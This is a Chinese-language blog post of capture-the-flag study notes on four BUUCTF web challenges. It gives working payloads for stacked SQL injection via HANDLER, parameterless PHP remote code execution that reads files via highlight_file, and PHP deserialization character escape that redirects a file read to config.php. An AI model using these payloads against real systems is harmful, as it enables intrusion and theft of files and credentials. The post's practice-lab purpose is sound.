---
title: buu知识点复习(四)
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-09-02 21:27:03
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1097136.png
---
一、[GYCTF2020]Blacklist--sql注入
和强网杯那道题差不多，但是过滤了alter和rename。很明显不是上次那个方法了。
这里要用到handler这个东西
HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭
1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#


二、[De1CTF 2019]SSRF Me--python代码审计
这题没什么好记录的知识点，但是我认为是很重要的一题，因为比赛的时候多是这种综合性的代码审计。
https://blog.csdn.net/weixin_43900387/article/details/105278192
https://www.cnblogs.com/Cl0ud/p/12177116.html
研究了两小时，终于全部搞明白了，希望对以后做题的时候有所帮助。

三、[GXYCTF2019]禁止套娃--无参数RCE

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720200903122052.jpg)

1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。
2.过滤了常用的几个伪协议，不能以伪协议读取文件。
3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。
4.正则匹配掉了et/na/info等关键字，很多函数都用不了。
5：eval($_GET['exp']); 典型的无参数RCE

首先需要扫描目录下的文件，这就需要构造：
print_r(scandir('.'));
但怎么实现用函数替换中间的参数呢，这就需要localeconv()，localeconv()自带常量为 . 。
current()函数可以返回数组中当前元素的值，所以payload：
print_r(scandir(current(localeconv())));
flag.php在第四位，next()函数可以读取下一位，但是只能使用一次，因为中间必须是数组形式，所以不能像next(next())这样连续使用。
所以还需要用到array_reverse()，交换前后顺序，最后highlight_file输出，payload：
highlight_file(next(array_reverse(scandir(current(localeconv())))));

四、[0CTF 2016]piapiapia--源码分析、php反序列化字符逃逸
终于找到字符逃逸的了。源码因为时间原因就不分析了。（这篇博客拖了三天了）
直接说利用点吧：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200905111248.png)

通过www.zip源码泄露得知flag在config.php，所以理论上只要另$profile[‘photo’]的值为config.php就可以读取flag了。

$profile = a:4:{s:5:"phone";s:11:"12345673845";s:5:"email";s:8:"11@q.com";s:8:"nickname";s:6:"Troy3e";s:5:"photo";s:10:"config.php";}s:39:"upload/c7350266700fbcdc4ff49fcdf65ec863";}

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200905111742.png)

$profile = a:4:{s:5:"phone";s:11:"12345673845";s:5:"email";s:8:"11@q.com";s:8:"nickname";a:1:{i:0;s:1:"1"};s:5:"photo";s:10:"config.php";}s:39:"upload/c7350266700fbcdc4ff49fcdf65ec863";}

但是现在的photo还在nickname里，怎么让$profile[‘photo’]的值为comfig.php呢，这里就要用到字符逃逸。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/123141.jpg)

利用这个正则，where会被替换成hacker，增加了一位，那么输入34个where即可顶掉"};s:5:"photo";s:10:"config.php";}，使$profile[‘photo’]的值为config.php。

$profile = a:4:{s:5:"phone";s:11:"12345673845";s:5:"email";s:8:"11@q.com";s:8:"nickname";a:1:{i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"};s:5:"photo";s:10:"config.php";}s:39:"upload/c7350266700fbcdc4ff49fcdf65ec863";}

最后注册登录抓包查看即可。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/12311.jpg)

